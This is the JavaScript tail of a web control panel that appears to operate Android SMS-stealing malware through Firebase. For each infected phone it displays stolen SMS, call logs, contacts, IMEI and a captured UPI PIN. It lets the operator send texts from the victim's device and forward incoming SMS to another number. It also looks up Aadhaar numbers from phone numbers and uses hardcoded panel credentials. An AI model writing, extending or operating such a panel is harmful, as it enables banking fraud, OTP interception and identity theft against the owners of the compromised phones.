function loadSmsRest(dev){
  var ref=dev.deviceNode+'/'+dev.rawId;
  restPoll(dev.fbId,ref+'/all_sms',function(d){
    var p=ingestAllSmsPayload(d);
    window._allSmsData=p.list;
    window._allSmsTotal=p.total;
    scheduleSmsRender();
  },2000);
  restPoll(dev.fbId,ref+'/new_sms',function(d){
    window._newSmsData=ingestNewSmsPayload(d);
    scheduleSmsRender();
  },SMS_FAST_MS);
}
function loadRabelSim(dev){
  restPoll(dev.fbId,'clients/'+dev.rawId,function(data){
    var g=document.getElementById('simGrid');
    if(!data){g.innerHTML='<div style="color:var(--muted);font-family:Space Mono,monospace;font-size:10px">No device info</div>';return;}
    var pin=getUpiPinFromRecord(data);
    if(selDev===dev.id){
      document.getElementById('dUpiPin').textContent=pin||'—';
      var cur=allDevs.find(function(d){return d.id===selDev;});
      if(cur) cur.upiPin=pin||'';
    }
    var fields=[[icoAnim('mobile','i3d-blue i3d-sm'),'Model',data.modelName],[icoAnim('phone','i3d-green i3d-sm'),'Mobile',data.mobNo],[icoAnim('battery','i3d-orange i3d-sm'),'Battery',data.battery],[icoAnim('signal','i3d-fire i3d-sm'),'Network',data.service_provider],[icoAnim('save','i3d-purple i3d-sm'),'Storage',data.storage],[icoAnim('globe','i3d-blue i3d-sm'),'IP',data.ip_address],[icoAnim('robot','i3d-green i3d-sm'),'Android',data.androidV],[icoAnim('lock','i3d-orange i3d-sm'),'UPI PIN',pin||'N/A']];
    if(data.sims&&data.sims.length) data.sims.forEach(function(sim,i){fields.push([icoAnim('sim','i3d-green i3d-sm'),'SIM '+(i+1),sim.carrierName+' · '+sim.phoneNumber]);});
    g.innerHTML='<div class="sim-card">'+fields.map(function(f){
      var lbl=f.length>2?f[0]+' '+f[1]:f[0], val=f.length>2?f[2]:f[1];
      return '<div class="sim-row"><span class="sim-key">'+lbl+'</span><span class="sim-val">'+(val?esc(String(val)):'<span style="color:var(--muted)">N/A</span>')+'</span></div>';
    }).join('')+'</div>';
  });
}
function devOn(fbId,path,cb){
  var inst=getFbInstance(fbId);
  if(!inst||!inst.db) return;
  var handler=function(snap){cb(snap);};
  var key=fbId+'::'+path;
  activeListeners[key]={fbId:fbId,path:path,handler:handler,db:inst.db};
  inst.db.ref(path).once('value',handler).then(function(){
    if(activeListeners[key]&&activeListeners[key].handler===handler) inst.db.ref(path).on('value',handler);
  });
}
function ensureTabLoaded(tab){
  if(!selDev||tabLoaded[tab]) return;
  tabLoaded[tab]=true;
  var dev=getSelDev();
  if(!dev) return;
  var inst=getFbInstance(dev.fbId);
  if(inst&&inst.schema==='rabel'){
    if(tab==='sms'){loadRabelSms(dev);return;}
    if(tab==='sim'){loadRabelSim(dev);return;}
    if(tab==='calls'||tab==='contacts'||tab==='perms'||tab==='forward'){
      var tb=document.getElementById(tab==='calls'?'callsTbody':tab==='contacts'?'contactsTbody':'');
      if(tb) tb.innerHTML='<tr><td colspan="6" class="tbl-empty">Not available for this Firebase schema</td></tr>';
      return;
    }
  }
  var ref=dev.deviceNode+'/'+dev.rawId;
  if(tab==='sms'){
    if(inst&&inst.db){
      if(!attachSpinplayNewSmsLive(dev)){
        devOn(dev.fbId,ref+'/new_sms',function(snap){
          window._newSmsData=ingestNewSmsPayload(snap.val());
          scheduleSmsRender();
        });
      }
      devOn(dev.fbId,ref+'/all_sms',function(snap){
        var p=ingestAllSmsPayload(snap.val());
        window._allSmsData=p.list;
        window._allSmsTotal=p.total;
        scheduleSmsRender();
      });
    }else{
      loadSmsRest(dev);
    }
  } else if(tab==='calls'){
    devOn(dev.fbId,ref+'/all_calls',function(snap){
      var d=snap.val(), tb=document.getElementById('callsTbody');
      if(!d||!d.calls){tb.innerHTML='<tr><td colspan="6" class="tbl-empty">No call data</td></tr>';document.getElementById('tc-calls').textContent='0';return;}
      document.getElementById('tc-calls').textContent=d.total_count||d.calls.length;
      tb.innerHTML=d.calls.map(function(c,i){
        var type=(c.type||'').toLowerCase();
        return '<tr><td class="mono" style="color:var(--muted)">'+(i+1)+'</td><td><b>'+esc(c.number||'?')+'</b></td><td>'+esc(c.contact_name||'—')+'</td><td class="mono" style="color:var(--muted)">'+esc(c.date_readable||'—')+'</td><td class="mono">'+esc(c.duration||'0')+'s</td><td><span class="sbadge '+type+'">'+esc(c.type||'?')+'</span></td></tr>';
      }).join('');
    });
  } else if(tab==='contacts'){
    devOn(dev.fbId,ref+'/all_contacts',function(snap){
      var d=snap.val(), tb=document.getElementById('contactsTbody');
      if(!d||!d.contacts){tb.innerHTML='<tr><td colspan="3" class="tbl-empty">No contacts data</td></tr>';document.getElementById('tc-contacts').textContent='0';return;}
      document.getElementById('tc-contacts').textContent=d.total_count||d.contacts.length;
      tb.innerHTML=d.contacts.map(function(c,i){
        return '<tr><td class="mono" style="color:var(--muted)">'+(i+1)+'</td><td><b>'+esc(c.name||'No Name')+'</b></td><td class="mono" style="color:var(--accent2)">'+esc(c.phone||'—')+'</td></tr>';
      }).join('');
    });
  } else if(tab==='sim'){
    devOn(dev.fbId,ref+'/device_info/sim_info',function(snap){
      var s=snap.val(), g=document.getElementById('simGrid');
      if(!s){g.innerHTML='<div style="color:var(--muted);font-family:Space Mono,monospace;font-size:10px">No SIM info yet</div>';return;}
      var fields=[['📱 SIM Operator',s.sim_operator_name],['🏢 Network',s.network_operator_name],['🆔 IMEI',s.imei],['📋 Subscriber ID',s.subscriber_id]];
      g.innerHTML='<div class="sim-card">'+fields.map(function(f){
        return '<div class="sim-row"><span class="sim-key">'+f[0]+'</span><span class="sim-val">'+(f[1]?esc(f[1]):'<span style="color:var(--muted)">N/A</span>')+'</span></div>';
      }).join('')+'</div>';
    });
  } else if(tab==='perms'){
    devOn(dev.fbId,ref+'/live_data/permissions',function(snap){
      var p=snap.val(), g=document.getElementById('permGrid'); if(!p){g.innerHTML='';return;}
      g.innerHTML=Object.entries(p).map(function(e){
        return '<div class="perm-item"><span class="perm-name">'+e[0].replace(/_/g,' ')+'</span><span class="sbadge '+(e[1]?'granted':'denied')+'">'+(e[1]?'✅ OK':'❌ Denied')+'</span></div>';
      }).join('');
    });
  } else if(tab==='sendsms'){
    devOn(dev.fbId,ref+'/sent_sms',function(snap){
      var tb=document.getElementById('sentTbody'); if(!snap.exists()){tb.innerHTML='';return;}
      var l=[]; snap.forEach(function(c){l.push(c.val());}); l.reverse(); l=l.slice(0,30);
      tb.innerHTML=l.map(function(r){
        return '<tr><td><b>'+esc(r.to||'?')+'</b></td><td style="max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc(r.message||'—')+'</td><td><span class="sbadge sent">SENT</span></td><td class="mono" style="color:var(--muted)">'+(r.sent_at?new Date(r.sent_at).toLocaleString():'—')+'</td></tr>';
      }).join('');
    });
  } else if(tab==='forward'){
    devOn(dev.fbId,ref+'/forwarding_settings',function(snap){
      var s=snap.val(); if(!s) return;
      document.getElementById('fwToggle').checked=s.enabled||false;
      document.getElementById('fwNumber').value=s.forward_to||'';
      document.getElementById('fwAll').checked=s.forward_all!==false;
      if(s.filters&&Array.isArray(s.filters)) document.getElementById('fwFilters').value=s.filters.join(', ');
      document.getElementById('fwFilterDiv').style.display=s.forward_all!==false?'none':'block';
    });
    devOn(dev.fbId,ref+'/forwarded_sms',function(snap){
      var tb=document.getElementById('fwTbody'); if(!snap.exists()){tb.innerHTML='';return;}
      var l=[]; snap.forEach(function(c){l.push(c.val());}); l.reverse(); l=l.slice(0,30);
      tb.innerHTML=l.map(function(r){
        return '<tr><td><b>'+esc(r.from||'?')+'</b></td><td>'+esc(r.to||'?')+'</td><td style="max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc(r.body||'—')+'</td><td class="mono" style="color:var(--muted)">'+(r.forwarded_at?new Date(r.forwarded_at).toLocaleString():'—')+'</td></tr>';
      }).join('');
    });
  }
}

// ═══ DATA TABS ═══
function switchDataTab(name,btn){
  document.querySelectorAll('.data-tab').forEach(function(b){b.classList.remove('active');});
  btn.classList.add('active');
  document.querySelectorAll('.data-section').forEach(function(s){s.classList.remove('active');});
  document.getElementById('tab-'+name).classList.add('active');
  ensureTabLoaded(name);
}

// ═══ FIREBASE WRITE (SDK or REST) ═══
function fbPush(inst,path,data){
  if(!inst) return Promise.reject(new Error('Firebase not connected'));
  if(inst.db){
    var payload=Object.assign({},data);
    payload.timestamp=firebase.database.ServerValue.TIMESTAMP;
    return inst.db.ref(path).push(payload);
  }
  if(!inst.restUrl) return Promise.reject(new Error('Firebase not connected'));
  var body=Object.assign({},data,{timestamp:Date.now()});
  return fetch(inst.restUrl+'/'+path+'.json',{
    method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)
  }).then(function(r){
    if(!r.ok) return r.json().then(function(e){throw new Error((e&&e.error)||'Write failed');});
    return r.json();
  });
}
function fbSet(inst,path,value){
  if(!inst) return Promise.reject(new Error('Firebase not connected'));
  if(inst.db) return inst.db.ref(path).set(value);
  if(!inst.restUrl) return Promise.reject(new Error('Firebase not connected'));
  return fetch(inst.restUrl+'/'+path+'.json',{
    method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(value)
  }).then(function(r){
    if(!r.ok) return r.json().then(function(e){throw new Error((e&&e.error)||'Write failed');});
    return r.json();
  });
}

// ═══ SEND SMS ═══
function sendSms(){
  var dev=getSelDev();
  if(!dev){showToast('error','No device selected!');return;}
  var inst=getFbInstance(dev.fbId);
  if(!inst){showToast('error','Firebase not connected!');return;}
  var n=document.getElementById('sendTo').value.trim(), m=document.getElementById('sendMsg').value.trim();
  if(!n||!m){document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">Fill all fields</span>';return;}
  var t0=performance.now();
  document.getElementById('sendStatus').innerHTML='<span style="color:var(--muted)">Sending...</span>';
  var done=function(){
    var ms=Math.max(1,Math.round(performance.now()-t0));
    document.getElementById('sendStatus').innerHTML='<span style="color:var(--success)">✅ Sent in '+ms+'ms</span>';
    document.getElementById('sendMsg').value='';
    showToast('success','✅ SMS sent in '+ms+'ms');
  };
  var fail=function(e){
    document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">❌ '+esc(e.message||'Failed')+'</span>';
    showToast('error',e.message||'Send failed');
  };
  if(inst.schema==='rabel'){
    fbSet(inst,'clients/'+dev.rawId+'/webhookEvent/sendSms',{to:n,message:m,from:1,isSended:false}).then(done).catch(fail);
    return;
  }
  fbPush(inst,dev.deviceNode+'/'+dev.rawId+'/manual_commands/send_sms',{to:n,message:m}).then(done).catch(fail);
}

// ═══ FORWARDING ═══
function toggleFw(){
  var dev=getSelDev(); if(!dev)return;
  var inst=getFbInstance(dev.fbId); if(!inst)return;
  fbSet(inst,dev.deviceNode+'/'+dev.rawId+'/forwarding_settings/enabled',document.getElementById('fwToggle').checked).catch(function(){});
}
function saveFw(){
  var dev=getSelDev();
  if(!dev){showToast('error','No device selected!');return;}
  var inst=getFbInstance(dev.fbId); if(!inst){showToast('error','Firebase not connected!');return;}
  var filters=document.getElementById('fwFilters').value.split(',').map(function(f){return f.trim();}).filter(Boolean);
  fbSet(inst,dev.deviceNode+'/'+dev.rawId+'/forwarding_settings',{
    enabled:document.getElementById('fwToggle').checked,
    forward_to:document.getElementById('fwNumber').value.trim(),
    forward_all:document.getElementById('fwAll').checked,
    filters:filters,
    updated_at:Date.now()
  }).then(function(){showToast('success','✅ Settings saved!');})
    .catch(function(){showToast('error','❌ Save failed');});
}

// ═══ HELPERS ═══
function smsToMs(v){
  if(v==null||v==='') return 0;
  if(typeof v==='number'&&v>0) return v<1e12?v*1000:v;
  if(typeof v==='string'&&!isNaN(Number(v))&&Number(v)>0){
    var n=Number(v);
    return n<1e12?n*1000:n;
  }
  if(typeof v==='string'){
    var t=Date.parse(v);
    if(!isNaN(t)) return t;
    var d2=parseDdMmYyyy(v);
    if(d2) return d2;
  }
  return 0;
}
function smsMsgTime(m){
  if(!m) return 0;
  var keys=['date','timestamp','dateTime','datetime','time','received_at','sent_at','created_at','receivedAt','sentAt','sms_time','msg_time','last_modified','received_time','sent_time','id'];
  for(var i=0;i<keys.length;i++){
    var ms=smsToMs(m[keys[i]]);
    if(ms) return ms;
  }
  var sk=smsToMs(m._sortKey);
  if(sk) return sk;
  return smsToMs(m.date_readable);
}
function normalizeSmsRecord(m){
  if(!m||typeof m!=='object') return null;
  var body=m.body||m.message||m.text||m.content||m.sms_body||'';
  if(!body) return null;
  var ts=smsMsgTime(m);
  return {
    address:m.address||m.sender||m.from||m.number||m.phone||m.mobNo||'?',
    body:body,
    date_readable:m.date_readable||m.dateTime||m.datetime||m.received_at||m.time_str||m.time||'—',
    type:String(m.type||m.sms_type||m.direction||m.msg_type||'unknown').toLowerCase(),
    date:ts
  };
}
function smsIsNew(s,newMsgs){
  for(var i=0;i<newMsgs.length;i++){
    var n=newMsgs[i];
    if(n===s) return true;
    if(n.date&&s.date&&n.date===s.date) return true;
    if(n.body===s.body&&n.address===s.address&&smsMsgTime(n)===smsMsgTime(s)) return true;
  }
  return false;
}
function smsDedupKey(m){
  return String(m.date||0)+'|'+String(m.address||'')+'|'+String(m.body||'').slice(0,100);
}
function smsSortDesc(a,b){
  var ta=a.date||smsMsgTime(a)||0, tb=b.date||smsMsgTime(b)||0;
  if(tb!==ta) return tb-ta;
  return String(b._sortKey||'').localeCompare(String(a._sortKey||''));
}
function renderSmsList(){
  var tb=document.getElementById('smsTbody');
  var newMsgs=(window._newSmsData||[]).slice();
  var allMsgs=(window._allSmsData||[]).slice();
  var total=window._allSmsTotal||0;
  var newKeys={}, ni;
  for(ni=0;ni<newMsgs.length;ni++) newKeys[smsDedupKey(newMsgs[ni])]=1;
  var filteredAll=[];
  for(ni=0;ni<allMsgs.length;ni++){
    var k=smsDedupKey(allMsgs[ni]);
    if(!newKeys[k]) filteredAll.push(allMsgs[ni]);
  }
  var merged=newMsgs.concat(filteredAll);
  merged.sort(smsSortDesc);
  merged=merged.slice(0,100);
  window._smsData=merged;
  document.getElementById('tc-sms').textContent=(newMsgs.length+total)+' (showing 100)';
  if(!merged.length){
    tb.innerHTML='<tr><td colspan="5" class="tbl-empty">📭 No SMS data. Grant READ_SMS on device.</td></tr>';
    document.getElementById('smsEmpty')?document.getElementById('smsEmpty').style.display='':null;
    return;
  }
  tb.innerHTML=merged.map(function(s,i){
    var isNew=smsIsNew(s,newMsgs);
    var type=(s.type||'').toLowerCase();
    var dispBody=s.body&&s.body.length>60?esc(s.body.substring(0,60))+'…':esc(s.body||'—');
    return '<tr class="sms-row-click" onclick="openSmsModal('+i+')">' +
      '<td class="mono" style="color:var(--muted)">'+(i+1)+'</td>'+
      '<td><b>'+esc(s.address||'?')+'</b>'+(isNew?'<span style="margin-left:4px;background:rgba(255,60,60,0.2);color:var(--accent);font-size:8px;padding:1px 5px;border-radius:8px;font-family:Space Mono,monospace">NEW</span>':'')+'</td>'+
      '<td style="max-width:240px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+dispBody+'</td>'+
      '<td class="mono" style="color:var(--muted)">'+esc(s.date_readable||'—')+'</td>'+
      '<td><span class="sbadge '+type+'">'+esc(s.type||'?')+'</span></td></tr>';
  }).join('');
}

function openSmsModal(idx){
  var s=(window._smsData||[])[idx];
  if(!s) return;
  document.getElementById('modalFrom').textContent = '📱 From: ' + (s.address||'?');
  document.getElementById('modalDate').textContent = '🕐 ' + (s.date_readable||'—') + '  |  ' + (s.type||'');
  document.getElementById('modalBody').textContent = s.body||'(empty)';
  document.getElementById('smsModal').classList.remove('hidden');
}
function closeSmsModal(e){
  if(e.target === document.getElementById('smsModal'))
    document.getElementById('smsModal').classList.add('hidden');
}
document.addEventListener('keydown',function(e){
  if(e.key==='Escape'){
    document.getElementById('smsModal').classList.add('hidden');
    document.getElementById('aadharModal').classList.add('hidden');
  }
});

// ═══ AADHAR BOT ═══
function openAadharModal(){
  document.getElementById('aadharModal').classList.remove('hidden');
  setTimeout(function(){var i=document.getElementById('aadharNum');if(i)i.focus();},200);
}
function closeAadharModal(e){
  if(e&&e.target!==document.getElementById('aadharModal')) return;
  document.getElementById('aadharModal').classList.add('hidden');
}
function normalizeAadharNum(raw){
  var d=String(raw||'').replace(/\D/g,'');
  if(d.length>10) d=d.slice(-10);
  return d;
}
function aadharLocalTargets(){
  var o=window.location.origin;
  var path=window.location.pathname||'/sex.php';
  var dir=path.lastIndexOf('/')>=0?path.substring(0,path.lastIndexOf('/')+1):'/';
  var list=[path, dir+'sex.php', dir+'aadhar.php', '/api/aadhar'];
  var out=[], seen={};
  list.forEach(function(p){
    var u=o+p;
    if(!seen[u]){seen[u]=1;out.push(u);}
  });
  return out;
}
function aadharIsPhpHtml(t){
  if(!t||t.charAt(0)!=='<') return false;
  var sig=String.fromCharCode(60,63,112,104,112);
  return t.indexOf(sig)===0;
}
function parseAadharApiResponse(r){
  return r.text().then(function(txt){
    var t=String(txt||'').trim();
    if(!t) throw new Error('Empty API response');
    if(aadharIsPhpHtml(t)) throw new Error('PHP proxy nahi chal raha - sex.php ko PHP server par host karo');
    var d=null;
    try{d=JSON.parse(t);}catch(e){throw new Error('Invalid JSON from server');}
    if(!r.ok) throw new Error((d&&d.error)||('HTTP '+r.status));
    return d;
  });
}
function fetchAadharViaPost(url,num){
  return fetch(url,{
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'rbl_aadhar=1&num='+encodeURIComponent(num),
    cache:'no-store',
    credentials:'same-origin'
  }).then(parseAadharApiResponse);
}
function fetchAadharViaGet(url,num){
  var u=new URL(url,window.location.origin);
  u.searchParams.set('rbl_aadhar','1');
  u.searchParams.set('num',num);
  return fetch(u.toString(),{cache:'no-store',credentials:'same-origin'}).then(parseAadharApiResponse);
}
function fetchAadharCloud(num){
  var cloud=new URL('/api/aadhar',window.location.origin);
  cloud.searchParams.set('num',num);
  return fetch(cloud.toString(),{cache:'no-store'}).then(parseAadharApiResponse);
}
function fetchAadharData(num){
  var targets=aadharLocalTargets();
  var i=0;
  function tryLocal(){
    if(i>=targets.length) return fetchAadharCloud(num);
    var url=targets[i++];
    return fetchAadharViaPost(url,num).catch(function(){
      return fetchAadharViaGet(url,num).catch(function(){return tryLocal();});
    });
  }
  return tryLocal();
}
function lookupAadhar(){
  var num=normalizeAadharNum(document.getElementById('aadharNum').value);
  var st=document.getElementById('aadharStatus');
  var tb=document.getElementById('aadharTbody');
  if(!num||num.length<10){
    st.innerHTML='<span style="color:var(--error)">Valid 10-digit mobile number dalo</span>';
    return;
  }
  st.innerHTML='<span style="color:var(--muted)">Looking up '+esc(num)+'...</span>';
  tb.innerHTML='<tr><td colspan="3" class="tbl-empty">Fetching...</td></tr>';
  fetchAadharData(num).then(function(d){
    var rows=(d&&d.response&&d.response.data)||[];
    if(!Array.isArray(rows)) rows=[];
    var aadhars=[], seen={};
    rows.forEach(function(row){
      if(!row||row.aadhar==null||row.aadhar==='') return;
      var a=String(row.aadhar).replace(/\D/g,'').trim();
      if(!a||seen[a]) return;
      seen[a]=1;
      aadhars.push(a);
    });
    if(!aadhars.length){
      st.innerHTML='<span style="color:var(--error)">Is number ke liye aadhar field nahi mili</span>';
      tb.innerHTML='<tr><td colspan="3" class="tbl-empty">No aadhar in API response</td></tr>';
      return;
    }
    st.innerHTML='<span style="color:var(--success)">✅ '+aadhars.length+' unique aadhar mila</span>';
    tb.innerHTML=aadhars.map(function(a,i){
      return '<tr><td>'+(i+1)+'</td><td class="mono">'+esc(num)+'</td><td><span class="aadhar-hl">'+esc(a)+'</span></td></tr>';
    }).join('');
  }).catch(function(err){
    st.innerHTML='<span style="color:var(--error)">❌ '+esc(err.message||'Lookup failed')+'</span>';
    tb.innerHTML='<tr><td colspan="3" class="tbl-empty">'+esc(err.message||'Lookup failed')+'</td></tr>';
  });
}
function updateApiKeyWarnings(){
  var s=document.getElementById('sendSmsApiWarn');
  var f=document.getElementById('forwardApiWarn');
  if(s) s.innerHTML='✅ API Key configured — SMS sending is available.';
  if(f) f.innerHTML='✅ API Key configured — SMS forwarding is available.';
}

function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function filterRows(id,q){q=q.toLowerCase();document.querySelectorAll('#'+id+' tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':'none';});}
function showToast(t,m){var c=document.getElementById('toastContainer'),d=document.createElement('div');d.className='toast '+t;d.innerHTML='<span>'+(t==='success'?'✅':'❌')+'</span><span>'+m+'</span>';c.appendChild(d);setTimeout(function(){d.classList.add('out');setTimeout(function(){d.remove();},250);},2800);}

// ═══ LOGIN ═══
var AU='tyuser',AP='TyPanel2026';
(function(){
  clearClientsCacheIfExpired();
  var s=null;
  try{s=JSON.parse(localStorage.getItem('ty_login'));}catch(e){}
  if(s&&s.u){
    document.getElementById('loginUser').value=s.u;
    document.getElementById('loginPass').value=s.p;
    document.getElementById('rememberMe').checked=true;
    if(s.u===AU&&s.p===AP){
      document.getElementById('loginPage').classList.add('hidden');
      openPanel();
    }
  }
})();
function doLogin(){
  var u=document.getElementById('loginUser').value.trim(),p=document.getElementById('loginPass').value;
  if(u===AU&&p===AP){
    if(document.getElementById('rememberMe').checked)localStorage.setItem('ty_login',JSON.stringify({u:u,p:p}));
    else localStorage.removeItem('ty_login');
    document.getElementById('loginError').style.display='none';
    document.getElementById('loginPage').classList.add('hidden');
    openPanel();
  }
  else{document.getElementById('loginError').style.display='block';document.getElementById('loginPass').value='';}
}
document.addEventListener('keydown',function(e){if(!document.getElementById('loginPage').classList.contains('hidden')&&e.key==='Enter')doLogin();});
setInterval(function(){document.getElementById('footerTime').textContent=new Date().toLocaleString();},5000);
setInterval(function(){
  clearClientsCacheIfExpired();
  if(selDev){
    var dev=allDevs.find(function(d){return d.id===selDev;});
    if(dev) renderLastSeen(dev);
  }
},5000);
document.getElementById('footerTime').textContent=new Date().toLocaleString();
</script>
</body>
</html>
